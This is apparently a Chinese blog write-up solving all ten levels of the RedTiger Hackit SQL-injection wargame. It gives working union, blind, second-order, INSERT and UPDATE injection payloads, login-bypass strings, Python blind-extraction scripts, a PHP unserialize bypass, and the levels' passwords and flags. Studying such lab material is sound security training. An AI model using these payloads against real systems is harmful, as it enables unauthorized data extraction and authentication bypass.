---
title: RedTiger's Hackit writeup
date: 2018-04-04 08:52:34
tags:
- sql注入
categories:
- web安全
- sql
- sql注入
---

网上很多关于RedTiger的writeup已失效，所以重新整理下，算是小白入门。
<!--more -->

# [RedTiger](http://redtiger.labs.overthewire.org)

## level1

点击Category：1后，网址以GET方式传递`cat`参数。
- 利用`and 1=1`,`and 1=2`进行判断是否存在注入点：
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=1 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=2 
```

- 存在数字型注入，利用order by 测试出存在4个列： 
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 5 
```

- 构造union联合查询语句，找回显： 
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 
```
发现3,4 处存在回显。

我这里继续爆库、爆表、爆字段等操作，发现异常。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,version(), database()
```
回显

		5.5.57-0+deb8u1
		hackit
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='level1_users'
```
回显

		Some things are disabled!!!

所以无法找出`level1_users`的字段了吗？
当然不是，点击登录按钮，在浏览器调试窗口（火狐的firebug或者F12）仔细看发送请求包，可知数据是POST发送的，字段为
	
	查询字符串
		cat:1
	表单数据
		user:
		password:
		login:login

开始试了试
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,user,password from level1_users
```
结果不对，而我观察到页面中给出的是`username`，所以换成它。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users

```
got it.拿到用户名密码后登录即可。
```
Hornoxe
thatwaseasy
```

## level2

```
curl "http://redtiger.labs.overthewire.org/level2.php" -H "Cookie: level2login=4_is_not_random" 
```
首先点击登陆按钮，抓取登陆数据包。有如下字段
	
	username=admin&password=admin&login=Login
先对`username`进行注入点测试，并尝试万能用户名。无果而返。
```
admin'
admin' --+
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1%23
admin')or('1'='1
```
接着对password测试：
```
'
```
但是得到的返回信息为：
	
	<b>Warning</b>:  mysql_num_rows() expects parameter 1 to be resource, boolean given in <b>/var/www/html/	hackit/level2.php</b> on line <b>48</b><br />
	Login incorrect!
说明存在字符型注入点。这就好办了。直接上sql万能密码
```
admin
' or '1'='1
```

## level3

```
curl "http://redtiger.labs.overthewire.org/level3.php" -H "Cookie: level3login=feed_your_cat_before_your_cat_feeds_you" 
```


```
Admin'
MDQyMjExMDE0MTgyMTQwMTc0
Admin' and '1'='2
MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM3
Admin' and '1'='1
MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg5MjA0MTAxMjUzMjE5MDI0MjMyMDY2MDY2MjM4
```

```
Admin' order by 8#
MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMxMDY2 # 报错
Admin' order by 7#
MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2 # 不报错
```

显示位还显示的Admin的信息，那找个数据库中没有的显示。
```
Admin' union select 1,2,3,4,5,6,7#
MDQyMjExMDE0MTgyMTQwMTc0MjIzMDc3MjA0MTA0MTc4MTQ2MDA5MTg4MDI2MDA5MTg2MDAyMjMzMDc0MDYwMTk5MjM3MjE5MDg3MjQ2MTU0MjA4MTc2MDk2MTMxMjIwMDUxMDU5
```

```
max' union select 1,2,3,4,5,6,7#
MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTMwMjEx
```
得到的回显位为：2,4,5,6,7。

	Show userdetails: <br>
					<table style="border-collapse:collapse; border:1px solid black;">
						<tr>
							<td>Username: </td>
							<td>2</td>
						</tr>
						<tr>
							<td>First name: </td>
							<td>6</td>
						</tr>
						<tr>
							<td>Name: </td>
							<td>7</td>
						</tr>
						<tr>
							<td>ICQ: </td>
							<td>5</td>
						</tr>
						<tr>
							<td>Email: </td>
							<td>4</td>
						</tr>
					</table>	
				<br><br><br>


```
# max' union select 1,2,3,4,5,6,(column_name) from information_schema.columns where table_name='level3_users' limit 0,1#
MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTU3MTQ3MTA3MTE2MTY1MTM5MjA0MTQ0MTEyMDM3MTg5MTUzMTA0MjE4MTcwMTc4MDE1MTk4MDAyMTUxMTIwMDg2MTMzMTMyMDY5MDQ3MTY0MTkwMDM3MDU2MTI0MTQwMDM2MDc5MTI1MTIyMTExMTQ5MTMyMDY2MTQ3MjA1MDcxMDQ3MTkzMjE0MTE3MTIzMTk5MDg3MTE5MTUzMDMzMTU3MjA1MDE3MDQ3MjIzMDU4MjQ0MTg3MDI5MTY4MDU4MjA0MjAzMDY2MjAyMDA1MDQ3MTMxMDI4MTY3MDk4MjE2MjQ0MjE3MTQwMjQ2MjAxMTg4MTk3MDQ2MDA3MTUzMDM3MTQ4MjA4
```
尝试暴列名出错。

	Show userdetails: <br>Some things are disabled!!!
还好知道字段，`password`，直接泄露即可。

```
# max' union select 1,2,3,4,5,6,password from level3_users where username='Admin'#
MDA2MjE0MDI3MjQ4MTk0MjUyMTQ1MDgxMjA1MTExMjUzMTQzMDc2MTYzMDI2MDA2MTcxMDY1MTcyMDcwMDYzMTk5MjM2MjE5MDgwMjQ2MTU1MjA4MTc5MDk2MTk3MTQ1MTE5MTA3MTY3MTM3MjA4MTcxMDYyMDM0MTYyMTQ3MDQ0MjE4MTYwMTY1MDIyMjA2MDc4MjA1MDczMDY5MTUzMTQ3MDkwMDYxMjQwMTYwMDM0MDUxMDgxMTU0MTAzMDgyMTA3MTE0MTI0MjEzMTM0MDY0MTU0MTMzMDEzMDAwMjE0MTU1MTA3MTI1MTMzMDA2
```
```
admin
thisisaverysecurepasswordEEE5rt
```
代码可以写作：
```
$payload2 ="max' union select 1,2,3,4,5,6,password from level3_users where username='Admin'#";
print_r($payload2);
print '<br>';
$en_payload = encrypt($payload2);
print_r($en_payload);
print '<br>';

```

## level4

网站
```
curl "http://redtiger.labs.overthewire.org/level4.php" -H "Cookie: level4login=there_is_no_bug"
```

	Welcome to Level 4

	Target: Get the value of the first entry in table level4_secret in column keyword
	Disabled: like

从`table_leel4`表中的`keyword`列得到第一个值。
这道题的提示是盲注。
点击`Click me`，得到带有`?id=1`的新链接`https://redtiger.labs.overthewire.org/level4.php?id=1`。

正常页面显示`Query returned 1 rows. `。
注入`'`，新页面显示`Query returned 0 rows. `。说明这是错误结果。

利用`布尔盲注`，通过返回页面中`Query returned 1 rows. `的结果来筛选出目标结果。

```
and (select ascii(substr(keyword,1,1)) from level4_secret limit 0,1)<{1}
```

利用脚本来进行盲注很easy。但是需要提前把SQL语句测试准确，以免带来额外的调试。

先获取值的长度，再逐个获取字符。这里采用折半搜索。

```
import requests
import re
url_length="http://redtiger.labs.overthewire.org/level4.php?id=1 and (select length(keyword) from level4_secret limit 0,1)<{0}"

cookies={"level2login":"4_is_not_random",
         "level3login":"feed_your_cat_before_your_cat_feeds_you",
         "level4login":"there_is_no_bug"
        }
h=50
l=1
length=(l+h)/2
while l <= h:
    url = url_length.format(length)
    resp=requests.get(url, cookies=cookies)
    if resp.status_code != 200:
        print "status code error "
    text = resp.content
    if text.find('Query returned 1 rows.') != -1: 
        h = length-1
    else:
        l = length+1
    length =(h+l)/2

print 'length = ', length
```

再进行逐个字符测试。
需要牢记的是ASCII字符集由95个可打印字符（**0x20-0x7E**）和33个控制字符（**0x00-0x19，0x7F**）组成。
由于采取了折半搜索，需要根据返回结果来判断，得到的字符是否需要+1。

```
import requests
import re
url_format="http://redtiger.labs.overthewire.org/level4.php?id=1 and (select ascii(substr(keyword,{0},1)) from level4_secret limit 0,1)>{1}"

cookies={"level2login":"4_is_not_random",
         "level3login":"feed_your_cat_before_your_cat_feeds_you",
         "level4login":"there_is_no_bug"
        }
result = ""
for i in range(1, 21+1):
    print "%d th round"%(i)
    h= 0x7E
    l= 0x20
    flag=0
    while l <= h:
        c=(l+h)/2
        #print 'h=', chr(h)
        #print 'l=', chr(l)
        #print 'c=%d'%c
        url = url_format.format(i,c)
        #print url
        resp=requests.get(url, cookies=cookies)
        if resp.status_code != 200:
            print "status code error "
        text = resp.content
        #print text
        if text.find('Query returned 1 rows.') == -1:
            h = c-1
            flag=0
        else:
            l = c+1
            flag=1
    print 'c=',c,' flag=', flag
    if flag:
        c+=1
    print 'found c = ', chr(c)
    result+=chr(c)

print 'result = ', result
```

还有python 提供了字符集，不用这么麻烦自己考虑了。
```
>>> help(string)

DATA
    ascii_letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
    ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    digits = '0123456789'
    hexdigits = '0123456789abcdefABCDEF'
    letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    lowercase = 'abcdefghijklmnopqrstuvwxyz'
    octdigits = '01234567'
    printable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTU...
    punctuation = '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
    uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    whitespace = '\t\n\x0b\x0c\r '
```


> You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa
> The password for the next level is: there_is_a_truck

## level5

> Target: Bypass the login
> Disabled: substring , substr, ( , ), mid
> Hints: its not a blind, the password is md5-crypted, watch the login errors

不能进行盲注。那就先输入`admin`用户和随便一个密码，显示
> Some things are disabled!!

看来`admin`这个词给过滤掉了。

然后测试 `username` 是否存在注入点，输入`'`。
> Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/html/hackit/level5.php on line 46
> User not found!

很好，然后熟练得测试出回显字段，得到2个回显字段。`' union select 1,2#`。这时显示的错误为 
> Login failed!
说明我们绕过了 `username` ，接下来对 `	password` 进行测试。

题目说 `password` 经过了 md5 加密，而且还过滤了 `(` 与 `)` 两个字符。 因此将 `password` 值为1，并对字符串'1' 进行md5加密，MD5('1')='c4ca4238a0b923820dcc509a6f75849b'。
测试到底是 select 的1位置用md5加密还是2位置用md5加密。
```
username= ' union select 1,'c4ca4238a0b923820dcc509a6f75849b'#
password=1
```
可以得到结果
> You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3
> The password for the next level is: for_more_bugs_update_to_php7




## level 6

```
curl 'http://redtiger.labs.overthewire.org/level6.php?user=1' -H 'Cookie:  level6login=for_more_bugs_update_to_php7'
```

可以用常规注入对url参数 `user=1`进行注入测试。但是测试回显字段时，未回显。
```
http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23
```
报错
	
	User not found
	Login failed! 

而得到user的username为 `deddlef` 。
```
http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23
```
	
	Username: 	deddlef
	Email: 	dumbi@damibi.de

可以用 `'deddlef'` 替换 `union select 1,2,3,4,5%23` 中的各个回显位置。还是报错。服务器应该过滤了 `'`。
用16进制 `0x646564646c6566` 继续替换查找，当替换 `2` 时，得到正确的回显结果。
那么可以怀疑后台先根据 `id` 查找 `username`，再根据 `username` 再次去查找 user信息的，我们可以利用 第二个回显位置进行进一步注入测试，但是要用16进制表示。
**二次注入**

```
# 测试回显数量，仍然是5个位置。
# ' order by 5# => 0x27206f72646572206279203523
http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203523,3,4,5%23
# ' order by 6# => 0x27206f72646572206279203623
http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203623,3,4,5%23
```
测试回显位：
```
# ' union select 1,2,3,4,5# => 0x2720756e696f6e2073656c65637420312c322c332c342c3523
http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%23
```

	Username: 	2
	Email: 	4

That's ez! 接下来按照要求输出即可。

```
# ' union select 1,username,3,password,5 from level6_users where status=1#   =>  0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123

http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%23
```

> Username: 	admin
> Email: 	m0nsterk1ll
> You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932
> The password for the next level is: keep_in_mind_im_not_blind

## level 7


正常输入 `google` 会得到以下信息。

	Google: The browser is the computer
	SAN FRANCISCO--Google spent Wednesday morning trying to get developers excited about the next generation of Web t...

输入 `google'` 会得到很详细的sql语句报错。
```
SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%google'%' OR text.title LIKE '%google'%')
```

想办法闭合google前面的 `'%` ，也把后面给注释掉。于是输入 `%')--+`，但是仍然报错。网上通过注释来解题的方法已经不好使了。

不用注释掉后面，那么可以把后面的 `%'` 给闭合掉。输入 `%' and '%'='` 即可得到正常页面。

那么可以加入 `%' and 1=1 and '%'='`

此题用布尔型盲注。


```
SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%google%' and 1=1 and '%'=%' OR text.title LIKE '%google%' and 1=1 and '%'=%')
```

除了过滤给出的函数外，还过滤了常用的注释符。

对于过滤了字符串截取函数 `substr` , `left` 的话，可以使用 `locate` 来进行代替。还需要通过 `collate latin1_general_cs` 或者 `latin1_bin` 来判断字符的大小写。

```
LEFT(str,len)
Returns the leftmost len characters from the string str, or NULL if any argument is NULL.


SUBSTR(str,pos), SUBSTR(str FROM pos), SUBSTR(str,pos,len), SUBSTR(str FROM pos FOR len) 
SUBSTR() is a synonym for SUBSTRING().

SUBSTRING(str,pos), SUBSTRING(str FROM pos), SUBSTRING(str,pos,len),SUBSTRING(str FROM pos FOR len)
The forms without a len argument return a substring from string str starting at position pos. The forms with a len argument return a substring len characters long from string str, starting at position pos. The forms that use FROM are standard SQL syntax. It is also possible to use a negative value for pos. In this case, the beginning of the substring is pos characters from the end of the string, rather than the beginning. A negative value may be used for pos in any of the forms of this function. 

LOCATE(substr,str), LOCATE(substr,str,pos)
The first syntax returns the position of the first occurrence of substring substr in string str. The second syntax returns the position of the first occurrence of substring substr in string str, starting at position pos. Returns 0 if substr is not in str. Returns NULL if substr or str is NULL. 

```

先得到 `autor` 字段的长度。
```
import requests
import string
from time import sleep

cookies={"level7login": "keep_in_mind_im_not_blind"}
url_base = "http://redtiger.labs.overthewire.org/level7.php"
params={"dosearch" : "search!", "search": "google" }
headers = {"Connection": "close"}

def get_len():
    lens=1
    while lens < 50:
        print "lens is ", lens
        params['search'] = "google%' and length(news.autor)={0} and '%'='".format(lens)
        resp =requests.post(url_base, data=params, cookies=cookies)
        if resp.status_code != 200:
            print "status code is not 200"
        content = resp.content
        #found id
        if content.find("Google: The browser is the computer") != -1 :
            break
        lens+=1
    return lens
```

得到17，然后逐一比较出每个字符。这里需要注意，服务器过滤了很多字符，比如 `<` 、 `>` ，`substr` 、 `substring` 、 `left` 等。只能用相等关系来比较了。


```
lens= 17
def get_item():
    result=""
    for start in range(5, lens+1):
        print "scanning ", start, " position"
        for char in string.printable:
            params['search']="google%' and locate('{0}',news.autor collate latin1_bin,{1})={1} and '%'='".format(char, start)
            #print params
            try:
                resp =requests.post(url_base, data=params, cookies=cookies, headers=headers)
            except requests.exceptions.ConnectionError:
                print "Connection refused by the server.."
                sleep(3)
                continue

            if resp.status_code != 200:
                print "status code is not 200"
            content = resp.content
            #found id
            if content.find("Google: The browser is the computer") != -1 :
                print "#Found ", (char)
                result+= (char)
                break
    return result
result = get_item()
print "result is ", result

```


**注意**

1.Max retries exceeded with URL

访问太频繁会`requests` 包会报错上述错误。可以根据 `requests.exceptions.ConnectionError` 来判断。
这时候可以降低访问速度，即休眠几秒钟。还有就是当发送HTTP请求包的时候，让服务器断开连接。在请求包的 `headers` 中加入 ` {"Connection": "close"}` 。

2.校对规则 `collation`

校对规则是怎么回事呢？它是一组规则，负责决定某一字符集下的字符进行比较和排序的结果。

比如说，有latin1字符集中的字母A和a，我们需要它们在比较的时候相等，那么，我们可以使用字符集校对规则 latin1_general_ci；这种校对规则在比较和排序的时候不区分大小写；如果我们需要他们在比较的时候不等呢？也很简单，我们可以使用字符集校对规则latin1_bin;这种校对规则会以二进制的方式对字符进行比较，很明显，a和A的二进制编码不同，比较的结果就是不等。

可以通过 `show collation` 来查看数据库对校对规则的支持。


答案是 `TestUserforg00gle`

> User correct.
> You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80
> The password for the next level is: no_pernel_kanic_on_the_titanic

## level 8

点击 `edit` ，可以更改用户的信息。

测试注入点，在 `email` 处输入 `'` 得到报错信息。

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the > right syntax to use near '12345', age = '25' WHERE id = 1' at line 3

在 `email` 的内容前面输入 `'`，得到更精确的信息。

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the > right syntax to use near 'hans@localhost'', icq = '12345', age = '25' WHERE id = 1' at line 3 

可以确定这是一条更新语句。
猜测sql语句为：
```
update user set email='$email',icq='$icq',age='$age' where id=1 
```
可以利用 `update` 将 `password`更新到 `name` 字段，注意 `'`的闭合。


update user set email='hans@localhost`',name=password,icq='`',icq='12345',age='25' where id=1 



> You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715
> The password for the next level is: cybercyber_vuln

## level 9

这题输入`autor=123`、 `title=123`、 `text=123` 会在数据库中插入此条信息。

分别测试三个字段，发现注入点在 `text` 字段。报错信息为：

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the > right syntax to use near ''123'')' at line 6

这里SQL语句还原应该是 `'$text')` ，这里应当是 `insert` 语句。

```
insert into tablename(autor, title, text) values('$autor', '$title', '$text');
```
测试，

```
autor=123&title=123&text=123'),('4','5','6&post=Submit+Query
```
成功。

根据题目要求，`Get username and password of any user. Tablename: level9_users` 。

```
autor=123&title=123&text=123'),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),'6&post=Submit+Query
```

> Autor: TheBlueFlower
> Title: this_oassword_is_SEC//Ure.promised!
> 6 



> You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679
> The password for the next level is: get_post_cookie_head__kittens_eating_all_my_bread

## level 10


点击 `Login` 得到登陆用户为 `Monkey`。
```
login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9
```

注入`'` 到 `login`参数，得到正常结果，但是将 `login` 原参数删除一些字符后，得到报错结果。

> Notice: unserialize(): Error at offset 68 of 68 bytes in /var/www/html/hackit/level10.php on line 34

`login`的值为字母和数字的组合，应该是 `Base64` 加密后的结果，用 `base64` 解密，可得：


	a:2:{s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";}

在用PHP 的  `unserialize` 反序列化得到：

	array (
	  'username' => 'Monkey',
	  'password' => '0815password',
	)

由于是 `array` 数据， 可以将 `password` 设置为 `true`， 绕过密码判断。

```
array (
  'username' => 'TheMaster',
  'password' => true,
)
```

经过 序列化 后得到
```
a:2:{s:8:"username";s:9:"TheMaster";s:8:"password";b:1;}
```

在经过 `Base64` 加密。

```
login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=&dologin=Login
```

通关！

> Welcome TheMaster.
> You solved the hackit :)
> You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52
> The password for the hall of fame is: exec_is_safer_than_unserialize

终于将10关搞定。

> Congratulation. You solved all 10 levels of the hackit.
> If you want to put your name into the hall of fame you can use the form below.

## 参考网站
[1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
[2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
[3] [Redtiger Hackit Writeup](https://blog.spoock.com/2016/07/25/redtiger-writeup/)
[4] [RedTiger libs writeup](http://ph0rse.me/2017/07/29/RedTiger-libs-writeup/)
[5] [RedTiger's Hackit](http://lucifaer.com/index.php/archives/19/)